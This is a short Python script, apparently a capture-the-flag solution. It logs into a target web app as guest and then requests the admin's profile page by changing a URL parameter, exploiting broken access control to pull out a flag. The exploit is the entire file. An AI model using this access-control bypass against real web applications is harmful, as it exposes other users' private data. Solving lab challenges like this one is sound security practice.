#!/usr/bin/python3

import requests
import re

url = input("The IP is: ")
s = requests.Session()

login = s.post("http://"+ url +"/login.php", data={"username":"guest","password":"guest"})
flag = s.get("http://"+ url +"/profile.php", params={"user":"admin"})

print(re.findall('flag\{.*\}', flag.text)[0])
